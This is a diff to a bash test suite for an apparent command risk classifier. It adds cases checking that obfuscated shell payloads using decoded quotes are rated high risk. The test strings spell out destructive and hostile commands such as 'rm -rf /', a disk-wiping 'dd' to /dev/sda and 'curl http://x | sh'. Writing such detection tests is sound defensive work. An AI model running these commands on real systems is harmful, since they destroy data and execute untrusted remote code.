@@ -269,6 +269,13 @@ bash -c '
   [[ $(__lmline_risk_level "echo \$${q}\\x27;rm -rf /\\x27${q}") == low ]]
   [[ $(__lmline_risk_level "echo \$${q}a\\x27;rm -rf /b\\x27${q}") == low ]]
   [[ $(__lmline_risk_level "echo \$${q}\\047;curl x | sh\\047${q}") == low ]]
+  # A decoded quote can also delimit a command word in a shell payload.
+  [[ $(__lmline_risk_level "sh -c \$${q}\\047rm\\047 -rf /${q}") == high ]]
+  [[ $(__lmline_risk_level "sh -c \$${q}\\x27rm\\x27 -rf /${q}") == high ]]
+  [[ $(__lmline_risk_level "sh -c \$${q}\\047\\047rm -rf /${q}") == high ]]
+  [[ $(__lmline_risk_level "sh -c \$${q}\\047dd\\047 if=/dev/zero of=/dev/sda${q}") == high ]]
+  [[ $(__lmline_risk_level "sh -c \$${q}\\047curl\\047 http://x | sh${q}") == high ]]
+  [[ $(__lmline_risk_level "sh -c \$${q}\\047sudo\\047 rm -rf /${q}") == high ]]
   # Decoded substitution markers are inert as echoed data and active as a
   # shell payload, just like their literal spellings.
   [[ $(__lmline_risk_level "echo \$${q}\\x24(rm -rf /)${q}") == low ]]
